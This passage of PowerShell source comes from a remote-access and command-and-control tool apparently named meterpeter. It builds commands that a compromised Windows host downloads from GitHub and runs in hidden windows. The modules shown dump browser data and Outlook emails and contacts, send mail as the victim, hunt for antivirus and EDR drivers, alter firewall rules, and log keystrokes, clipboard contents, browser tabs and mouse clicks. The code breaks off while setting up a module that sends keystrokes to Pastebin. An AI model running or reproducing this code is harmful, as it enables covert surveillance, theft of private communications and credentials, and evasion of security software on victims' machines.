           $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/GetBrowsers.ps1`" -OutFile `"`$Env:TMP\GetBrowsers.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\GetBrowsers.ps1 -ADDONS;Remove-Item -Path `$Env:TMP\BrowserEnum.log -Force;Remove-Item -Path `$Env:TMP\GetBrowsers.ps1 -Force"
         }
         If($Enumerate_choise -ieq "Verbose")
         {
           write-host " * Installed browsers verbose query." -ForegroundColor Green
           write-host "   => This function takes aprox 1 minute to finish." -ForegroundColor DarkYellow
           $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/GetBrowsers.ps1`" -OutFile `"`$Env:TMP\GetBrowsers.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\GetBrowsers.ps1 -ALL;Remove-Item -Path `$Env:TMP\BrowserEnum.log -Force;Remove-Item -Path `$Env:TMP\GetBrowsers.ps1 -Force"
         }
         If($Enumerate_choise -ieq "Return" -or $Enumerate_choise -ieq "cls" -or $Enumerate_choise -ieq "Modules" -or $Enumerate_choise -ieq "clear")
         {
          $choise = $Null;
          $Command = $Null;
          $Enumerate_choise = $Null;
        }
      }
      If($choise -ieq "Recent" -or $choise -ieq "rece")
      {
         #$path = "$env:userprofile\AppData\Roaming\Microsoft\Windows\Recent"
         write-host " * Listing recent folder contents." -ForegroundColor Green;Start-Sleep -Seconds 1
         $Command = "Get-ChildItem `$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Recent|Select-Object Length,Name,CreationTime,LastWriteTime,Attributes|Format-Table -AutoSize|Select -SkipLast 1|Out-File startup.txt;Get-content startup.txt;Remove-Item startup.txt -Force"
      }
      If($choise -ieq "ListSMB" -or $choise -ieq "smb")
      {
         write-host " * Listing remote SMB shares." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "";
         $Command = "Get-SmbShare|Select-Object Name,Path,Description|ft|Out-File smb.txt;Start-Sleep -Seconds 1;`$i = Get-Content smb.txt;If(-not(`$i)){echo `"   Error: none SMB accounts found under current system..`" `> smb.txt};Get-Content smb.txt;remove-item smb.txt -Force";
      }
      If($choise -ieq "StartUp" -or $choise -ieq "start")
      {
         write-host " * Listing remote host StartUp contents." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "";
         $Command = "Get-ChildItem `"`$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup`"|Select-Object Length,Name,LastWriteTime|Format-Table -AutoSize|Out-File startup.txt;`$checkme = Get-Content -Path startup.txt;If(-not(`$checkme ) -or `$checkme -ieq `$null){echo `"   Error: none contents found on startup directory!`" `> startup.txt};Get-Content -Path startup.txt;Remove-Item startup.txt -Force";
      }
      If($choise -ieq "ListRun" -or $choise -ieq "run")
      {
         write-host " * Enumerating startup entrys (regedit)" -ForegroundColor Green;Start-Sleep -Seconds 1;write-host ""
         $Command = "REG QUERY `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`"|Where-Object { `$_ -ne '' }|Out-File runen.meterpeter -Force;echo `"`" `>`> runen.meterpeter;REG QUERY `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`"| Where-Object { `$_ -ne '' } `>`> runen.meterpeter;echo `"`" `>`> runen.meterpeter;REG QUERY `"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`"| Where-Object { `$_ -ne '' } `>`> runen.meterpeter;Get-content -Path runen.meterpeter;Remove-Item -Path runen.meterpeter -Force";
      }  
      If($choise -ieq "AntiVirus" -or $choise -ieq "avp")
      {
         write-host "`n`n   Description:" -ForegroundColor Yellow;
         write-host "   Enumerates the most common security processes running, ";
         write-host "   AppWhitelisting, Behavioral Analysis, Intrusion Detection";
         write-host "   DEP, DLP, Firewall, HIPS and Hunt for EDR's by driver name.";
         write-host "`n`n   Modules   Description                    Privileges Required" -ForegroundColor green;
         write-host "   -------   -----------                    -------------------";
         write-host "   Primary   PrimaryAV + Security processes UserLand";
         write-host "   FastScan  Security processes + EDR hunt  UserLand";
         write-host "   Verbose   Full scan module (accurate)    UserLand";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Adv:Avp> " -NoNewline -ForeGroundColor Green;
         $my_choise = Read-Host;
         If($my_choise -ieq "Primary")
         {
            write-host " * Listing Primary AV Product (Fast)" -ForegroundColor Green;Start-Sleep -Seconds 1
            $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetCounterMeasures.ps1`" -outfile `"`$Env:TMP\GetCounterMeasures.ps1`"|Unblock-File;powershell -File `$Env:TMP\GetCounterMeasures.ps1 -Action Enum;Remove-Item -Path `$Env:TMP\GetCounterMeasures.ps1 -Force";
         }
         If($my_choise -ieq "FastScan")
         {
            write-host " * Listing Remote Host Counter Measures (Fast)" -ForegroundColor Green;
            write-host "   => Search for string(s) inside driver file description." -ForegroundColor DarkYellow;
            write-host "   => Slipt diferent strings to search with PIPE (|) command." -ForegroundColor DarkYellow;
            Start-Sleep -Seconds 1
            
            Write-Host " - Search for string(s): " -NoNewline;
            $StringToSearch = Read-Host;
            If(-not($StringToSearch) -or $StringToSearch -eq $null)
            {
               write-host "   => Error: wrong input, use default strings." -ForegroundColor Red
               $StringToSearch = "Defender|antimalware|sandboxing|Symantec|AVG|Avast|BitDefender|Comodo|Cisco|ESET|FireEye|F-Secure|Kaspersky|Malwarebytes|McAfee|Panda|Sophos|SentinelOne"
            }

            #Execute command remote
            $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetCounterMeasures.ps1`" -outfile `"`$Env:TMP\GetCounterMeasures.ps1`"|Unblock-File;powershell -File `$Env:TMP\GetCounterMeasures.ps1 -Action 'enum' -stringsearch 'true' -string `"$StringToSearch`";Remove-Item -Path `$Env:TMP\GetCounterMeasures.ps1 -Force";
         }
         If($my_choise -ieq "Verbose")
         {
            write-host " * Listing Remote Host Counter Measures (Accurate)" -ForegroundColor Green;
            write-host "   => This function takes aprox 1 minute to finish." -ForegroundColor DarkYellow;Start-Sleep -Seconds 1
            $StringToSearch = "Defender|antimalware|sandboxing|Symantec|AVG|Avast|BitDefender|Comodo|Cisco|ESET|FireEye|F-Secure|Kaspersky|Malwarebytes|McAfee|Panda|Sophos|SentinelOne"
            $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetCounterMeasures.ps1`" -outfile `"`$Env:TMP\GetCounterMeasures.ps1`"|Unblock-File;powershell -File `$Env:TMP\GetCounterMeasures.ps1 -Action Verbose -stringsearch 'true' -string `"$StringToSearch`";Remove-Item -Path `$Env:TMP\GetCounterMeasures.ps1 -Force";
         }
         If($my_choise -ieq "Return" -or $my_choise -ieq "cls" -or $my_choise -ieq "Modules" -or $my_choise -ieq "clear")
         {
           $Command = $Null;
           $my_choise = $Null;
         }
      }
      If($choise -ieq "OutLook")
      {
         write-host "`n`n   Description:" -ForegroundColor Yellow;
         write-host "   Module to enumerate OutLook Exchange Emails, Read is contents";
         write-host "   on terminal console or dump found Email Objects to a logfile.";
         write-host "   If invoked -SemdMail then target address will be used as Sender." -ForegroundColor Yellow;
         write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
         write-host "   -------   -----------                     ------------------";
         write-host "   Folders   Display outlook folder names    UserLand";
         write-host "   Contacts  Display outlook contacts info   UserLand";
         write-host "   Emails    Display outlook email objects   UserLand";
         write-host "   Filter    SenderName objects <Info|Body>  UserLand";
         write-host "   SendMail  Send Email using target domain  UserLand";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Adv:OutLook> " -NoNewline -ForeGroundColor Green;
         $OutLook_choise = Read-Host;
         If($OutLook_choise -ieq "Folders")
         {
            #Execute command remotely
            Write-Host " * Scanning OutLook for folder names!" -ForegroundColor Green
            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'folders' -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if RealTimeProtection its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}";
         }
         If($OutLook_choise -ieq "Contacts")
         {
            Write-Host " - Max outlook items to display: " -NoNewline;
            $MaxOfObjectsToDisplay = Read-Host;
            If(-not($MaxOfObjectsToDisplay) -or $MaxOfObjectsToDisplay -ieq $null)
            {
               $MaxOfObjectsToDisplay = "5" #Default cmdlet parameter
            }

            Write-Host " - Create report logfile? (y|n): " -NoNewline;
            $CreateLogFileSetting = Read-Host;
            If($CreateLogFileSetting -iMatch '^(y|yes)$')
            {
               $CreateLogFileSetting = "True"
            }
            Else
            {
               $CreateLogFileSetting = "False"            
            }

            #Execute command remotely
            Write-Host " * Scanning OutLook for Contact Objects" -ForegroundColor Green
            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'contacts' -maxitems '$MaxOfObjectsToDisplay' -logfile `"$CreateLogFileSetting`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if RealTimeProtection its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
         }
         If($OutLook_choise -ieq "Emails")
         {
            Write-Host " - Max outlook items to display: " -NoNewline;
            $MaxOfObjectsToDisplay = Read-Host;
            If(-not($MaxOfObjectsToDisplay) -or $MaxOfObjectsToDisplay -ieq $null)
            {
               $MaxOfObjectsToDisplay = "5" #Default cmdlet parameter
            }

            Write-Host " - Display message <BODY> (y|n): " -NoNewline;
            $UseVerbose = Read-Host;
            If($UseVerbose -iMatch '^(y|yes)$')
            {
               $UseVerbose = "True"
            }
            Else
            {
               $UseVerbose = "False"            
            }

            Write-Host " - Create report logfile? (y|n): " -NoNewline;
            $CreateLogFileSetting = Read-Host;
            If($CreateLogFileSetting -iMatch '^(y|yes)$')
            {
               $CreateLogFileSetting = "True"
            }
            Else
            {
               $CreateLogFileSetting = "False"            
            }

            #Execute command remotely
            Write-Host " * Scanning OutLook for Email Objects" -ForegroundColor Green
            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'enum' -MaxItems `"$MaxOfObjectsToDisplay`" -logfile `"$CreateLogFileSetting`" -verb `"$UseVerbose`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if RealTimeProtection its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
         }
         If($OutLook_choise -ieq "Filter" -or $OutLook_choise -ieq "SenderName")
         {
            Write-Host " - Search 'SenderName' Objects : " -NoNewline;
            $SenderNameSearch = Read-Host;
            If(-not($SenderNameSearch) -or $SenderNameSearch -ieq $null)
            {
               write-host ""
               write-host " [error] This function requires 'SenderName' inputs .." -ForegroundColor Red -BackgroundColor Black
               $OutLook_choise = $null
               $Command = $Null;
            }
            Else
            {

               Write-Host " - Max outlook items to display: " -NoNewline;
               $MaxOfObjectsToDisplay = Read-Host;
               If(-not($MaxOfObjectsToDisplay) -or $MaxOfObjectsToDisplay -ieq $null)
               {
                  $MaxOfObjectsToDisplay = "5" #Default cmdlet parameter
               }

               Write-Host " - Display message <BODY> (y|n): " -NoNewline;
               $UseVerbose = Read-Host;
               If($UseVerbose -iMatch '^(y|yes)$')
               {
                  $UseVerbose = "True"
               }
               Else
               {
                  $UseVerbose = "False"            
               }

               Write-Host " - Create report logfile? (y|n): " -NoNewline;
               $CreateLogFileSetting = Read-Host;
               If($CreateLogFileSetting -iMatch '^(y|yes)$')
               {
                  $CreateLogFileSetting = "True"
               }
               Else
               {
                  $CreateLogFileSetting = "False"            
               }

               #Execute command remotely
               Write-Host " * Scanning OutLook for '$SenderNameSearch' Objects" -ForegroundColor Green
               $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'enum' -MaxItems `"$MaxOfObjectsToDisplay`" -logfile `"$CreateLogFileSetting`" -Filter `"$SenderNameSearch`" -verb `"$UseVerbose`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if RealTimeProtection its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
            }
         }
         If($OutLook_choise -ieq "SendMail")
         {

            #<SendTo>, <SendSubject>, <SendBody>
            Write-Host " - SendTo Email : " -NoNewline;
            $SendTo = Read-Host;
            If(-not($SendTo) -or $SendTo -ieq $null)
            {
               write-host "`n"
               write-host "   [Error] Module requires 'SendTo' address!" -ForegroundColor Red -BackgroundColor Black
               write-host "   [ inf ] SendTo: 'pedroUbuntui@gmail.com'" -ForegroundColor DarkGray
               $OutLook_choise = $null
               $Command = $null
            }
            Else
            {
               Write-Host " - Email Subject: " -NoNewline;
               $SendSubject = Read-Host;
               If(-not($SendSubject) -or $SendSubject -ieq $null)
               {
                  $SendSubject = "@Meterpeter C2 v2.10.11 Email"
               }

               Write-Host " - Email Body   : " -NoNewline;
               $SendBody = Read-Host;
               If(-not($SendBody) -or $SendBody -ieq $null)
               {
                  $SendBody = "Testing @Meterpeter C2 SendEmail funtion ..."
               }

               #Execute command remotely
               Write-Host " * Send Email using OutLook!" -ForegroundColor Green
               $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Unblock-File;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'send' -SendTo '$SendTo' -SendSubject '$SendSubject' -SendBody '$SendBody' -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if RealTimeProtection its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
            }
         }
         If($OutLook_choise -ieq "Return" -or $OutLook_choise -ieq "cls" -or $OutLook_choise -ieq "Modules")
         {
            $OutLook_choise = $null
            $Command = $Null;
         }
      }    
      If($choise -ieq "FRM" -or $choise -ieq "FRManager")
      {
         write-host "`n`n   Remark:" -ForegroundColor Yellow;
         write-host "   This module allow users to block connections to sellected";
         write-host "   local_port or from remote_port (default value set: 'Any')";
         write-host "   Warning: Total of 3 max multiple ports accepted. (Create)" -ForegroundColor Yellow;
         write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
         write-host "   -------   -----------                     -------------------";
         write-host "   Query     Query 'active' firewall rules   UserLand";
         write-host "   Create    Block application\program rule  Administrator";
         write-host "   Delete    Delete sellected firewall rule  Administrator";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Adv:Frm> " -NoNewline -ForeGroundColor Green;
         $Firewall_choise = Read-Host;
         If($Firewall_choise -ieq "Query")
         {
            Write-Host " * Listing active firewall rules." -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/SilenceDefender_ATP.ps1`" -OutFile `"`$Env:TMP\SilenceDefender_ATP.ps1`"|Unblock-File;powershell -File `$Env:TMP\SilenceDefender_ATP.ps1 -Action Query;Remove-Item -Path `"`$Env:TMP\SilenceDefender_ATP.ps1`" -Force"
         }
         If($Firewall_choise -ieq "Create")
         {
            Write-Host " * Create new 'Block' firewall rule." -ForegroundColor Green
            Write-Host "   => Remark: Dont use double quotes in inputs!" -ForegroundColor Yellow
            
            Write-Host " - The new firewall rule DisplayName: " -NoNewline;
            $DisplayName = Read-Host
            If(-not($DisplayName) -or $DisplayName -ieq $null)
            {
               $DisplayName = "Block-Firefox"
               Write-Host "   => Error: wrong input, set demo to '$DisplayName'" -ForegroundColor Red
            }

            Write-Host " - The Program to 'block' full path : " -NoNewline;
            $Program = Read-Host
            If(-not($Program) -or $Program -ieq $null)
            {
               $Program = "$Env:ProgramFiles\Mozilla Firefox\firefox.exe"
               Write-Host "   => Error: wrong input, set demo to 'firefox.exe'" -ForegroundColor Red
            }

            Write-Host " - The Program remote port to block : " -NoNewline;
            $RemotePort = Read-Host
            If(-not($RemotePort) -or $RemotePort -ieq $null)
            {
               $RemotePort = "Any"
               Write-Host "   => Error: wrong input, set demo to '$RemotePort'" -ForegroundColor Red
            }


            Write-Host " - The Program local port to block  : " -NoNewline;
            $LocalPort = Read-Host
            If(-not($LocalPort) -or $LocalPort -ieq $null)
            {
               $LocalPort = "Any"
               Write-Host "   => Error: wrong input, set demo to '$LocalPort'" -ForegroundColor Red
            }

            Write-Host " - TCP Direction (Outbound|Inbound) : " -NoNewline;
            $Direction = Read-Host
            If(-not($Direction) -or $Direction -ieq $null)
            {
               $Direction = "Inbound"
               Write-Host "   => Error: wrong input, set demo to '$Direction'" -ForegroundColor Red
            }

            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/SilenceDefender_ATP.ps1`" -OutFile `"`$Env:TMP\SilenceDefender_ATP.ps1`"|Unblock-File;powershell -File `$Env:TMP\SilenceDefender_ATP.ps1 -Action Create -DisplayName `"$DisplayName`" -Program `"$Program`" -LocalPort `"$LocalPort`" -RemotePort `"$RemotePort`" -Direction $Direction;Remove-Item -Path `"`$Env:TMP\SilenceDefender_ATP.ps1`" -Force"
         }
         If($Firewall_choise -ieq "Delete")
         {
            Write-Host " * Delete existing Block\Allow firewall rule." -ForegroundColor Green
            Write-Host "   => Remark: Dont use double quotes in inputs!" -ForegroundColor Yellow

            Write-Host " - The DisplayName of the rule to delete: " -NoNewline;
            $DisplayName = Read-Host
            If(-not($DisplayName) -or $DisplayName -ieq $null)
            {
               Write-Host "`n`n   x Error: Module requires a firewall rule name.`n" -ForegroundColor Red
               $Command = $null
            }
            Else
            {
               $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/SilenceDefender_ATP.ps1`" -OutFile `"`$Env:TMP\SilenceDefender_ATP.ps1`"|Unblock-File;powershell -File `$Env:TMP\SilenceDefender_ATP.ps1 -Action Delete -DisplayName `"$DisplayName`";Remove-Item -Path `"`$Env:TMP\SilenceDefender_ATP.ps1`" -Force"         
            }
         }
         If($Firewall_choise -ieq "Return" -or $Firewall_choise -ieq "cls" -or $Firewall_choise -ieq "Modules" -or $Firewall_choise -ieq "clear")
         {
           $Command = $Null;
           $Firewall_choise = $Null;
         }
      }
      If($choise -ieq "Return" -or $choise -ieq "return" -or $choise -ieq "cls" -or $choise -ieq "Modules" -or $choise -ieq "modules")
      {
        $Command = $Null;
      }
      $choise = $Null;
      $Clear = $True;
    }

    If($Command -ieq "keylogger")
    {
        write-host "`n`n   Description" -ForegroundColor Yellow
        write-host "   This module captures screenshots of mouse-clicks Or,"
        write-host "   Captures keyboard keystrokes and store them on %TMP%"
        write-host "   Remark: Pastebin module requires 'Keystrokes' running" -ForegroundColor Yellow
        write-host "`n`n   Modules     Description                     Remark" -ForegroundColor green;
        write-host "   -------     -----------                     ------";
        write-host "   Mouse       Start remote Mouse Logger       Start record remote MouseClicks"
        write-host "   Keystrokes  Start\Stop remote keylogger     Start record remote keyStrokes";
        write-host "   Pastebin    Send keystrokes to pastebin     Max of 20 pastes allowed by day";
        write-host "   Browser     Capture browser(s) tab title    Start\Stop\Leak windows tab title"
        write-host "   Clipboard   Capture clipboard strings       Start record remote clipboard"
        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:keylogger> " -NoNewline -ForeGroundColor Green;
        $choise = Read-Host;
        If($choise -ieq "Clipboard")
        {
              Write-Host " - The Clipboard capture time in seconds (30)  : " -NoNewline
              $CaptureTime = Read-Host
              If([string]::IsNullOrEmpty($CaptureTime))
              {
                 $CaptureTime = "30"
                 write-host "   => Error: wrong input, default to 30 (sec)" -ForegroundColor Red
              }

              Write-Host " - Store files passed to the clipboard (yes|no): " -NoNewline
              $Forensic = Read-Host

              ## Print OnScreen
              write-host "`n`n   capture  : " -NoNewline
              write-host "$CaptureTime" -ForegroundColor Red -NoNewline
              write-host " (seconds)"
              write-host "   logfile  : %TMP%\clipboard.log"

              If($Forensic -iMatch '^(y|yes)$')
              {
                 write-host "   Forensic : %TMP%\Forensic\`n"
                 $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Xclipboard.ps1`" -OutFile `"`$Env:TMP\Xclipboard.ps1`"|Unblock-File;cd `$Env:TMP;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file Xclipboard.ps1 -action Capture -CaptureTime $CaptureTime -Forensic -CleanUp`""
              }
              Else
              {
                 write-host ""
                 $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Xclipboard.ps1`" -OutFile `"`$Env:TMP\Xclipboard.ps1`"|Unblock-File;cd `$Env:TMP;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file Xclipboard.ps1 -action Capture -CaptureTime $CaptureTime -CleanUp`""
              }
         }
        If($choise -ieq "Browser")
        {
           Write-Host " - Start or Stop browser keyloger? (start|stop): " -ForegroundColor DarkYellow -NoNewline
           $Exechoise = Read-Host
           If($Exechoise -iMatch '^(stop)$')
           {
              write-host ""
              $Command = "If(Test-Path -Path `"`$Env:TMP\Browser.report`"){`$PPID = (Get-Content -Path `"`$Env:TMP\Browser.report`"|Select-String -Pattern '\s*Process Id+\s*:+\s') -replace '\s*Process Id+\s*:+\s','';If(`$PPID){echo `"Stoping Process ID: `$PPID`" `> `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\fdx.log;Remove-Item -Path `"`$Env:TMP\fdx.log`" -Force;Stop-Process -Id `"`$PPID`" -Force;Get-Content -Path `$Env:TMP\Browser.report;Remove-Item -Path `"`$Env:TMP\Browser.report`" -Force;Remove-Item -Path `"`$Env:TMP\BrowserLogger.ps1`" -Force}Else{echo `"   Error: fail to find keyloger process PID`" `> `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\Browser.report;Remove-Item -Path `"`$Env:TMP\fdx.log`" -Force;Remove-Item -Path `"`$Env:TMP\Browser.report`" -Force;Remove-Item -Path `"`$Env:TMP\BrowserLogger.ps1`" -Force}}Else{echo `"   NotFound: `$Env:TMP\Browser.report`" `> `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\fdx.log;Remove-Item -Path `"`$Env:TMP\fdx.log`" -Force;Remove-Item -Path `"`$Env:TMP\BrowserLogger.ps1`" -Force}"
           }
           Else
           {
              Write-Host " - Delay time (in seconds) between captures (3): " -NoNewline
              $Delay = Read-Host
              If($Delay -lt 3)
              {
                 write-host "   => Error: wrong input, default to 3 (sec)" -ForegroundColor Red
              }

              $StarTimer = (Get-Date -Format 'HH:mm')
              Write-Host " - Schedule the capture start time? ($StarTimer|now): " -NoNewline
              $StartMe = Read-Host
              If($StartMe -NotMatch '^(\d+\d+:+\d+\d)$')
              {
                 $StartMe = "now"
              }

              Write-Host " - Dump installed browsers url history? (y|n)  : " -NoNewline
              $DumpHistory = Read-Host
              If($DumpHistory -Match '^(y|yes)$')
              {
                 $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1`" -OutFile `"`$Env:TMP\browserLogger.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file `$Env:TMP\browserLogger.ps1 -starttime $StartMe -delay $Delay -log -history -force true`";echo `"`n   Browser keylogger schedule to: [$StartMe] hours`";echo `"   Logfile: `$Env:TMP\Browser.report`""
              }
              Else
              {
                 $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1`" -OutFile `"`$Env:TMP\browserLogger.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file `$Env:TMP\browserLogger.ps1 -delay $Delay -starttime $StartMe -log -force true`";echo `"`n   Browser keylogger schedule to: [$StartMe] hours`";echo `"   Logfile: `$Env:TMP\Browser.report`""           
              }
           }
        }
        If($choise -ieq "Mouse")
        {
        
           ## Random FileName generation
           $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
           $CaptureFile = "$Env:TMP\MouseCapture-" + "$Rand.zip" ## Capture File Name
           Write-Host " - Time of capture (seconds): " -NoNewline
           [int]$Timmer = Read-Host
           If([int]$Timmer -lt 10)
           {
              $Timmer = "15"
              Write-Host "   => Error: wrong input, set demo to '$Timmer'" -ForegroundColor Red
           }

           #banner
           Write-Host "`n`n   Capture      Timer     Remote Storage" -ForegroundColor Green
           Write-Host "   -------      ------    --------------"
           Write-Host "   MouseClicks  $Timmer(sec)   %TMP%\MouseCapture-${Rand}.zip`n"

           If(Test-Path "$Env:WINDIR\System32\psr.exe")
           {
              $Command = "Start-Process -WindowStyle hidden powershell -ArgumentList `"psr.exe`", `"/start`", `"/output `$Env:TMP\MouseCapture-$Rand.zip`", `"/sc 1`", `"/maxsc 100`", `"/gui 0;`", `"Start-Sleep -Seconds $Timmer;`", `"psr.exe /stop`" -EA SilentlyContinue|Out-Null"
           }
           Else
           {
              Write-Host "    => error: '$Env:WINDIR\System32\psr.exe' not found .." -ForegroundColor Red -BackgroundColor Black
           }
        }
        If($choise -ieq "Keystrokes")
        {
           Write-Host " - Start or Stop keystrokes keyloger? (start|stop): " -ForegroundColor DarkYellow -NoNewline
           $Exechoise = Read-Host
           If($Exechoise -iMatch '^(stop)$')
           {
              ## Stop recording system keystrokes
              $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/keymanager.ps1`" -OutFile `"`$Env:TMP\KeyManager.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\KeyManager.ps1`" -Action 'Stop';Remove-Item -Path `"`$Env:TMP\KeyManager.ps1`" -Force"
           }
           Else
           {
              Write-Host " - Use PS v2 to exec keylogger? (y|n): " -NoNewline
              $UsePS2 = Read-Host
              If($UsePS2 -iMatch '^(y|yes)$')
              {
                 $UsePS2 = "true"
              }
              Else
              {
                 $UsePS2 = "false"           
              }

              ## Capture remote host keystrokes
              $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/keymanager.ps1`" -OutFile `"`$Env:TMP\KeyManager.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\KeyManager.ps1`" -Action 'Start' -UsePS2 $UsePS2;Remove-Item -Path `"`$Env:TMP\KeyManager.ps1`" -Force"
           }
        }
        If($choise -ieq "PasteBin")
        {
           write-host "`n`n   Description" -ForegroundColor Yellow
           write-host "   -----------"
           write-host "   This module takes the contents of keylogger logfile (void.log)"
           write-host "   and creates a new pastebin paste from it on the sellected account"
           write-host "   each sellected time interval (120 sec) a max of 20 times (max pasts)"
           write-host "   Recomended timeout: " -NoNewline;
           write-host "3600 (one paste each hour)" -ForegroundColor Yellow -NoNewline
           write-host " maxpastes: " -NoNewline
           write-host "10 (max)" -ForegroundColor Yellow

           write-host "`n`n   Modules   Description                  Remark" -ForegroundColor green;
           write-host "   -------   -----------                  ------";
           write-host "   Start     Send keystrokes to pastebin  max of 20 pastes allowed by day";
           write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
           write-host "`n`n :meterpeter:keylogger:PasteBin> " -NoNewline -ForeGroundColor Green;
           $PasteBinChoise = Read-Host;
           If($PasteBinChoise -ieq "Start")
           {
              $PasteSettings = "True"
              Write-Host " - Input PastebinUsername  : " -NoNewline
              $PastebinUsername = Read-Host
              If($PastebinUsername -eq $null)
              {
                 $PasteSettings = "False"
                 $PastebinUsername = "missing pastebin acc name"
                 write-host "   => error: missing -PastebinUsername parameter" -ForegroundColor Red -BackgroundColor Black
              }

              Write-Host " - Input PastebinPassword  : " -NoNewline
              $PastebinPassword = Read-Host
              If($PastebinPassword -eq $null)
              {
                 $PasteSettings = "False"
